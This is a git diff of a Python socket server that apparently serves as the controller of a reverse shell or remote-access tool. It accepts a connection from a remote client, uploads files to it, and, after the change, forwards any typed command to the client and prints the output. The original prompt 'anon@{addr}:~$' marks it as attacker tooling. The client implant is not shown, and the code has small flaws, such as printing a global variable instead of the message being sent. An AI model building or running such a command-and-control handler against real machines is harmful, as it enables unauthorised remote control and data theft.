@@ -28,8 +28,10 @@ def upload_file(filename):
 
 
 def reliable_receive():
+        print("[+] Listening for response...")
         data = con.recv(4096).decode().rstrip()
         if data:
+            print("[+] Response Received.")
             return data
         else:
             print("[-] ERROR: Connection Timed Out, client unresponsive.")
@@ -37,11 +39,13 @@ def reliable_receive():
 
 
 def reliable_send(message):
+    print(f"[+] Sending command: {command}")
+
     con.sendall(bytes(message, "UTF-8"))
 
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-ip = '192.168.1.1'
+ip = 'localhost'
 port = 5000
 s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 s.bind((ip, port))
@@ -53,7 +57,8 @@ con, addr = s.accept()
 print(f"[+] Connected to {addr}")
 
 while True:
-    command = str(input(f"\nanon@{addr}:~$ "))
+    command = str(input(f"\n[-] Enter command to send: \n"))
+
 
     if command == 'exit':
         reliable_send(command)
@@ -86,13 +91,11 @@ while True:
     elif command[:7] == "upload ":
         reliable_send(command)
         upload_file(command[7:])
-    elif command[:7] == "CUSTOM ":
-        reliable_send(command[7:])
-        response = reliable_receive()
-        print(response)
 
     elif command.strip() == '':
         continue
 
     else:
-        print("Invalid command")
+        reliable_send(command)
+        response = reliable_receive()
+        print(response)
